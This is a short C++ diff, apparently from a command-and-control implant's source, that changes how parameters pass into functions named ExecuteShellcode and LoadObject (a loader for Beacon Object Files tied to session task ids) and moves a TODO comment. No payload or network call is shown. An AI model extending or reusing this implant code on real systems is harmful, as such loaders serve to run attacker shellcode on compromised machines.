@@ -192,7 +192,7 @@ namespace Memory {
             return true;
         }
 
-        BOOL ExecuteShellcode(const _parser& parser) {
+        BOOL ExecuteShellcode(_parser& parser) {
 
             void* address = { };
 
@@ -224,7 +224,7 @@ namespace Memory {
             return success;
         }
 
-        VOID LoadObject(_parser parser) {
+        VOID LoadObject(_parser &parser) {
 
             _coff_params* coff  = (_coff_params*) Malloc(sizeof(_coff_params));
             _coff_params* saved = nullptr;
@@ -236,8 +236,8 @@ namespace Memory {
             coff->coff_id       = UnpackUint32(&parser);
             coff->task_id       = Ctx->session.current_taskid;
 
-            // TODO: test that coff data size being zero is a correct way to do this
             // TODO: with previously loaded BOFs (peer_id, task_id, msg_type, msg_length, [entrypoint, null, args, etc..])
+            // TODO: test that coff data size being zero is a correct way to do this
 
             if (!coff->data_size) {
                 saved = GetCoff(coff->coff_id);
